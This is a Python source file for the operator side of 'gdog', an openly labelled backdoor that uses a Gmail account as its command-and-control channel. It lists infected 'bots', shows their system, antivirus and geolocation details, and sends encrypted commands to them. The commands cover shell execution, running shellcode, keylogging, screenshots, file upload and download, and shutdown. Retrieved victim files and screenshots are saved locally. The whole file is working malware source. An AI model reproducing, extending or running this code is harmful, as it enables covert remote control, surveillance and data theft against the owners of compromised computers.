"""
    This file is part of gdog
    Copyright (C) 2016 @maldevel
    https://github.com/maldevel/gdog
    
    gdog - A fully featured backdoor that uses Gmail as a C&C server

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
    
    For more see the file 'LICENSE' for copying permission.
"""

__author__ = "maldevel"
__copyright__ = "Copyright (c) 2016 @maldevel"
__credits__ = ["maldevel", "carnal0wnage", "byt3bl33d3r"]
__license__ = "GPLv3"
__version__ = "1.1"
__maintainer__ = "maldevel"


#####################
import argparse
import email
import imaplib
import sys
import base64
import string
import os
import json
import random
import hashlib

from base64 import b64decode
from smtplib import SMTP
from argparse import RawTextHelpFormatter
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
from Crypto.Cipher import AES
from Crypto import Random
######################################################


############################################
gmail_user = 'gdog.mail.account@gmail.com'
gmail_pwd = '!y0ur_p@ssw0rd!'
server = "smtp.gmail.com"
server_port = 587
AESKey = 'my_AES_key'
############################################


def generateJobID():
    return hashlib.sha256(''.join(random.sample(string.ascii_letters + string.digits, 30))).hexdigest()

class InfoSecurity:
    
    def __init__(self):
        self.bs = 32
        self.key = hashlib.sha256(AESKey.encode()).digest()
    
    def Encrypt(self, plainText):
        raw = self._pad(plainText)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw))
    
    def Decrypt(self, cipherText):
        enc = base64.b64decode(cipherText)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
    
    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    def _unpad(self, s):
        return s[:-ord(s[len(s)-1:])]
    
infoSec = InfoSecurity()


class MessageParser:

    def __init__(self, msg_data):
        self.attachment = None
        self.getPayloads(msg_data)
        self.getSubjectHeader(msg_data)
        self.getDateHeader(msg_data)

    def getPayloads(self, msg_data):
        for payload in email.message_from_string(msg_data[1][0][1]).get_payload():
            if payload.get_content_maintype() == 'text':
                self.text = payload.get_payload()
                self.dict = json.loads(infoSec.Decrypt(payload.get_payload()))

            elif payload.get_content_maintype() == 'application':
                self.attachment = payload.get_payload()

    def getSubjectHeader(self, msg_data):
        self.subject = email.message_from_string(msg_data[1][0][1])['Subject']

    def getDateHeader(self, msg_data):
        self.date = email.message_from_string(msg_data[1][0][1])['Date']


class Gdog:

    def __init__(self):
        self.c = imaplib.IMAP4_SSL(server)
        self.c.login(gmail_user, gmail_pwd)

    def sendEmail(self, botid, jobid, cmd, arg='', attachment=[]):

        if (botid is None) or (jobid is None):
            sys.exit("[-] You must specify a client id (-id) and a jobid (-job-id)")
        
        sub_header = 'gdog:{}:{}'.format(botid, jobid)

        msg = MIMEMultipart()
        msg['From'] = sub_header
        msg['To'] = gmail_user
        msg['Subject'] = sub_header
        msgtext = json.dumps({'cmd': cmd, 'arg': arg})
        msg.attach(MIMEText(str(infoSec.Encrypt(msgtext))))
        
        for attach in attachment:
            if os.path.exists(attach) == True:  
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(open(attach, 'rb').read())
                Encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
                msg.attach(part)

        mailServer = SMTP()
        mailServer.connect(server, server_port)
        mailServer.starttls()
        mailServer.login(gmail_user,gmail_pwd)
        mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
        mailServer.quit()

        print "[*] Command sent successfully with jobid: {}".format(jobid)


    def checkBots(self):
        bots = []
        self.c.select(readonly=1)
        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'hereiam:')")

        for idn in idlist[0].split():
            msg_data = self.c.uid('fetch', idn, '(RFC822)')
            msg = MessageParser(msg_data)
            
            try:
                botid = str(msg.subject.split(':')[1])
                if botid not in bots:
                    bots.append(botid)
                    
                    print botid, msg.dict['os']
            
            except ValueError:
                pass

    def getBotInfo(self, botid):

        if botid is None:
            sys.exit("[-] You must specify a client id (-id)")

        self.c.select(readonly=1)
        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'hereiam:{}')".format(botid))

        for idn in idlist[0].split():
            msg_data = self.c.uid('fetch', idn, '(RFC822)')
            msg = MessageParser(msg_data)

            print "ID: " + botid
            print "DATE: '{}'".format(msg.date)
            print "PID: " + str(msg.dict['pid'])
            print "USER: " + str(msg.dict['user'])
            print "OS: " + str(msg.dict['os'])
            print "ARCHITECTURE: " + str(msg.dict['arch'])
            print "CPU: " + str(msg.dict['cpu'])
            print "GPU: " + str(msg.dict['gpu'])
            print "MOTHERBOARD: " + str(msg.dict['motherboard'])  
            print "CHASSIS TYPE: " + str(msg.dict['chassistype'])
            print "ADMIN: " + str(msg.dict['isAdmin'])
            print "TOTAL RAM: {}GB".format(str(msg.dict['totalram']))
            print "BIOS: " + str(msg.dict['bios'])
            print "MAC ADDRESS: " + str(msg.dict['mac'])
            print "LOCAl IPv4 ADDRESS: " + str(msg.dict['ipv4'])
            print "Antivirus: '{}'".format(msg.dict['av'])
            print "Firewall: '{}'".format(msg.dict['firewall'])
            print "Antispyware: '{}'".format(msg.dict['antispyware'])
            print "TAG: " + str(msg.dict['tag'])
            print "CLIENT VERSION: " + str(msg.dict['version'])
            print "GEOLOCATION: '{}'".format(msg.dict['geolocation'])
            print "FG WINDOWS: '{}'\n".format(msg.dict['fgwindow'])
            
            
    def getJobResults(self, botid, jobid):

        if (botid is None) or (jobid is None):
            sys.exit("[-] You must specify a client id (-id) and a jobid (-job-id)")

        self.c.select(readonly=1)
        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'dmp:{}:{}')".format(botid, jobid))

        for idn in idlist[0].split():
            msg_data = self.c.uid('fetch', idn, '(RFC822)')
            msg = MessageParser(msg_data)

            print "DATE: '{}'".format(msg.date)
            print "JOBID: " + jobid
            print "FG WINDOWS: '{}'".format(msg.dict['fgwindow'])
            print "CMD: '{}'".format(msg.dict['msg']['cmd'])
            print ''
            print "'{}'\n".format(msg.dict['msg']['res'])
            #print msg.dict['msg']['res'] + '\n'

            if msg.attachment:

                if msg.dict['msg']['cmd'] == 'screenshot':
                    imgname = '{}-{}.png'.format(botid, jobid)
                    with open("./data/" + imgname, 'wb') as image:
                        image.write(b64decode(msg.attachment))
                        image.close()

                    print "[*] Screenshot saved to ./data/" + imgname

                elif msg.dict['msg']['cmd'] == 'download':
                    filename = "{}-{}".format(botid, jobid)
                    with open("./data/" + filename, 'wb') as dfile:
                        dfile.write(b64decode(msg.attachment))
                        dfile.close()

                    print "[*] Downloaded file saved to ./data/" + filename

    def logout(self):
        self.c.logout()


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description="""
                      __
           ____ _____/ /___  ____ _
          / __ `/ __  / __ \/ __ `/
         / /_/ / /_/ / /_/ / /_/ / 
         \__, /\__,_/\____/\__, /  
        /____/            /____/   

""",                                 
                                     version='1.0.0',
                                     formatter_class=RawTextHelpFormatter)
    
    parser.add_argument("-id", dest='id', type=str, default=None, help="Client to target")
    parser.add_argument('-jobid', dest='jobid', default=None, type=str, help='Job id to retrieve')

    agroup = parser.add_argument_group()
    blogopts = agroup.add_mutually_exclusive_group()
    blogopts.add_argument("-list", dest="list", action="store_true", help="List available clients")
    blogopts.add_argument("-info", dest='info', action='store_true', help='Retrieve info on specified client')

    sgroup = parser.add_argument_group("Commands", "Commands to execute on a client")
    slogopts = sgroup.add_mutually_exclusive_group()
    slogopts.add_argument("-cmd", metavar='CMD', dest='cmd', type=str, help='Execute a system command')
    slogopts.add_argument("-visitwebsite", metavar='URL', dest='visitwebsite', type=str, help='Visit website')
    slogopts.add_argument("-message", metavar=('TEXT', 'TITLE'), nargs=2, type=str, help='Show message to user')
    slogopts.add_argument("-tasks", dest='tasks', action='store_true', help='Retrieve running processes')
    slogopts.add_argument("-services", dest='services', action='store_true', help='Retrieve system services')
    slogopts.add_argument("-users", dest='users', action='store_true', help='Retrieve system users')
    slogopts.add_argument("-devices", dest='devices', action='store_true', help='Retrieve devices(Hardware)')
    slogopts.add_argument("-download", metavar='PATH', dest='download', type=str, help='Download a file from a clients system')
    slogopts.add_argument("-download-fromurl", metavar='URL', dest='fromurl', type=str, help='Download a file from the web')
    slogopts.add_argument("-upload", nargs=2, metavar=('SRC', 'DST'), help="Upload a file to the clients system")
    slogopts.add_argument("-exec-shellcode", metavar='FILE',type=argparse.FileType('rb'), dest='shellcode', help='Execute supplied shellcode on a client')
    slogopts.add_argument("-screenshot", dest='screen', action='store_true', help='Take a screenshot')
    slogopts.add_argument("-lock-screen", dest='lockscreen', action='store_true', help='Lock the clients screen')
    slogopts.add_argument("-shutdown", dest='shutdown', action='store_true', help='Shutdown remote computer')
    slogopts.add_argument("-restart", dest='restart', action='store_true', help='Restart remote computer')
    slogopts.add_argument("-logoff", dest='logoff', action='store_true', help='Log off current remote user')
    slogopts.add_argument("-force-checkin", dest='forcecheckin', action='store_true', help='Force a check in')
    slogopts.add_argument("-start-keylogger", dest='keylogger', action='store_true', help='Start keylogger')
    slogopts.add_argument("-stop-keylogger", dest='stopkeylogger', action='store_true', help='Stop keylogger')
    slogopts.add_argument("-email-checkin",type=int, metavar='CHECK', dest='email_check', help='Seconds to wait before checking for new commands')
    slogopts.add_argument("-jitter", metavar='jit',type=int, dest='jitter', help='Percentage of Jitter')
    
    if len(sys.argv) is 1:
        parser.print_help()
        sys.exit()

    args = parser.parse_args()
    
    gdog = Gdog()
    jobid = generateJobID()

    if args.list:
        gdog.checkBots()

    elif args.info:
        gdog.getBotInfo(args.id)

    elif args.cmd:
        gdog.sendEmail(args.id, jobid, 'cmd', args.cmd)

    elif args.visitwebsite:
        gdog.sendEmail(args.id, jobid, 'visitwebsite', args.visitwebsite)
        
    elif args.message:
        gdog.sendEmail(args.id, jobid, 'message', args.message)
        
    elif args.tasks:
        gdog.sendEmail(args.id, jobid, 'tasks')
    
    elif args.services:
        gdog.sendEmail(args.id, jobid, 'services')
        
    elif args.users:
        gdog.sendEmail(args.id, jobid, 'users')
        
    elif args.devices:
        gdog.sendEmail(args.id, jobid, 'devices')
        
    elif args.shellcode:
        gdog.sendEmail(args.id, jobid, 'execshellcode', args.shellcode.read().strip())

    elif args.download:
        gdog.sendEmail(args.id, jobid, 'download', r'{}'.format(args.download))

    elif args.fromurl:
        gdog.sendEmail(args.id, jobid, 'downloadfromurl', r'{}'.format(args.fromurl))
        
    elif args.upload:
        gdog.sendEmail(args.id, jobid, 'upload', r'{}'.format(args.upload[1]), [args.upload[0]])

    elif args.screen:
        gdog.sendEmail(args.id, jobid, 'screenshot')

    elif args.lockscreen:
        gdog.sendEmail(args.id, jobid, 'lockscreen')

    elif args.shutdown:
        gdog.sendEmail(args.id, jobid, 'shutdown')
        
    elif args.restart:
        gdog.sendEmail(args.id, jobid, 'restart')
        
    elif args.logoff:
        gdog.sendEmail(args.id, jobid, 'logoff')
        
    elif args.forcecheckin:
        gdog.sendEmail(args.id, jobid, 'forcecheckin')

    elif args.keylogger:
        gdog.sendEmail(args.id, jobid, 'startkeylogger')

    elif args.stopkeylogger:
        gdog.sendEmail(args.id, jobid, 'stopkeylogger')

    elif args.email_check:
        gdog.sendEmail(args.id, jobid, 'email_check', args.email_check)

    elif args.jitter:
        gdog.sendEmail(args.id, jobid, 'jitter', args.jitter)

    elif args.jobid:
        gdog.getJobResults(args.id, args.jobid)
                
